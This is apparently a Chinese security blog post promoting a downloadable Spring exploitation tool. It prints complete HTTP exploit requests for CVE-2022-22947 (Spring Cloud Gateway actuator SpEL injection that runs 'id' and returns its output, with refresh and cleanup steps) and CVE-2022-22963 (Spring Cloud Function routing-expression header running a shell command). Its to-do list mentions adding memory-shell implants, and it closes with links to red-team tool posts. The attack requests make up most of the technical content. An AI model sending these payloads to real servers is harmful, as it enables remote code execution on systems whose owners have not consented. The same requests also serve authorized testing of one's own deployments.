#  Spring漏洞综合利用工具   
savior-only  系统安全运维   2024-03-03 09:01  
  
# Spring_All_Reachable  
### TODO  
- Spring Core RCE  
  
- 支持更多类型内存马  
  
- 支持内存马密码修改  
  
........  
### 使用方法  
#### Spring Cloud Gateway命令执行（CVE-2022-22947）  
#### 漏洞描述  
  
Spring Cloud Gateway存在远程代码执行漏洞，该漏洞是发生在Spring Cloud Gateway应用程序的Actuator端点，其在启用、公开和不安全的情 况下容易受到代码注入的攻击。攻击者可利用该漏洞通过恶意创建允许在远程主机上执行任意远程请求。  
#### 漏洞影响  
  
VMWare Spring Cloud GateWay 3.1.0VMWare Spring Cloud GateWay >=3.0.0，<=3.0.6VMWare Spring Cloud GateWay <3.0.0  
  
漏洞poc  
```
POST /actuator/gateway/routes/hacktest HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 328

{
  "id": "hacktest",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"}
  }],
"uri": "http://example.com",
"order": 0
}
```  
```
POST /actuator/gateway/refresh HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```  
```
GET /actuator/gateway/routes/hacktest HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```  
```
DELETE /actuator/gateway/routes/hacktest HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
```  
```
POST /actuator/gateway/refresh HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```  
### 工具使用  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/GzdTGmQpRic0vg788pHUb2icQdejqR8NfeBTRYYhkCCtKRIr5KuWNqRica0GlQcFCJrAibcmyRyw1Tr9yiboBHepXkw/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/GzdTGmQpRic0vg788pHUb2icQdejqR8NfeBcdekLiasibKtTkAtl9ickL249SqokjIUc1xAvpByic7dPEz9dk2JAug0w/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/GzdTGmQpRic0vg788pHUb2icQdejqR8NfeOXw6CS7iadTHesibSlXXA116LHPw58Nymg4yicdicNSxfZSHUF7Eqyk3Gw/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1 "")  
### Spring Cloud Function SpEL 远程代码执行 (CVE-2022-22963)  
#### 漏洞描述  
  
Spring Cloud Function 是Spring cloud中的serverless框架。  
  
Spring Cloud Function 中的 RoutingFunction 类的 apply 方法将请求头中的“spring.cloud.function.routing-expression”参数作为 Spel 表达式进行处理，造成 Spel 表达式注入漏洞。  
  
攻击者可通过该漏洞执行任意代码。  
#### 漏洞影响  
  
org.springframework.cloud:spring-cloud-function-context（影响版本：3.0.0.RELEASE~3.2.2）  
#### 漏洞poc  
```
POST /functionRouter HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("touch /tmp/success")
Content-Type: text/plain
Content-Length: 4

test
```  
#### 工具使用  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/GzdTGmQpRic0vg788pHUb2icQdejqR8NfeIteneRib3zcGLfM0ibYlhII7oxG3yxZWQbvprymXwBwHGK0XxZxz2XKg/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/GzdTGmQpRic0vg788pHUb2icQdejqR8NfeLhx2hVbRMxnkHXiaZAFOvsNlwqmrW1cSFJuvE5gn4I4eBCj7icoNIc6w/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**下载地址：**  
  
https://github.com/savior-only/Spring_All_Reachable  
  
如有侵权，请联系删除  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QO6oDpE0HEmt8Ss52ibJFcYB7ZHBRVbIpxr9XXibHdW6Eib11FYq0FDZFNMUgDMcqTyfs6iaX8OtFdlL6ypEVHCLrw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
好文推荐  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QO6oDpE0HEmt8Ss52ibJFcYB7ZHBRVbIpzdIMlC9plAr8AiaQRUUvBFXZM2scib9zTnRyp0XZQxSUYAWWS0avKrCA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
[红队打点评估工具推荐](http://mp.weixin.qq.com/s?__biz=Mzk0NjE0NDc5OQ==&mid=2247508839&idx=1&sn=abc801070b0e44475887ddbf7273c2e7&chksm=c3087017f47ff901ecb212aadc22c5cbfc6407da79b43a6f48a355cc3fd8c5af79c113db5fd1&scene=21#wechat_redirect)  
  
  
[干货|红队项目日常渗透笔记](http://mp.weixin.qq.com/s?__biz=Mzk0NjE0NDc5OQ==&mid=2247509256&idx=1&sn=76aad07a0f12d44427ce898a6ab2769e&chksm=c3087678f47fff6e2b750f41514d933390a8f97efef8ed18af7d8fb557500009381cd434ec26&scene=21#wechat_redirect)  
  
  
[实战|后台getshell+提权一把梭](http://mp.weixin.qq.com/s?__biz=Mzk0NjE0NDc5OQ==&mid=2247508609&idx=1&sn=f3fcd8bf0e75d43e3f26f4eec448671f&chksm=c30871f1f47ff8e74551b09f092f8673890607257f2d39c0efa314d1888a867dc718cc20b7b3&scene=21#wechat_redirect)  
  
  
[一款漏洞查找器（挖漏洞的有力工具）](http://mp.weixin.qq.com/s?__biz=Mzk0NjE0NDc5OQ==&mid=2247507539&idx=2&sn=317a2c6cab28a61d50b22c07853c9938&chksm=c3080d23f47f8435b31476b13df045abaf358fae484d8fbe1e4dbd2618f682d18ea44d35dccb&scene=21#wechat_redirect)  
  
  
[神兵利器 | 附下载 · 红队信息搜集扫描打点利器](http://mp.weixin.qq.com/s?__biz=Mzk0NjE0NDc5OQ==&mid=2247508747&idx=1&sn=f131b1b522ee23c710a8d169c097ee4f&chksm=c308707bf47ff96dc28c760dcd62d03734ddabb684361bd96d2f258edb0d50e77cdb63a3600a&scene=21#wechat_redirect)  
  
  
[神兵利器 | 分享 直接上手就用的内存马（附下载）](http://mp.weixin.qq.com/s?__biz=Mzk0NjE0NDc5OQ==&mid=2247506855&idx=1&sn=563506565571f1784ad1cb24008bcc06&chksm=c30808d7f47f81c11b8c5f13ce3a0cc14053a77333a251cd6b2d6ba40dc9296074ae3ffd055e&scene=21#wechat_redirect)  
  
  
[推荐一款自动向hackerone发送漏洞报告的扫描器](http://mp.weixin.qq.com/s?__biz=Mzk0NjE0NDc5OQ==&mid=2247501261&idx=1&sn=0ac4d45935842842f32c7936f552ee21&chksm=c30816bdf47f9fab5900c9bfd6cea7b1d99cd32b65baec8006c244f9041b25d080b2f23fd2c1&scene=21#wechat_redirect)  
  
  
  
**关注我，学习网络安全不迷路**  
  
  
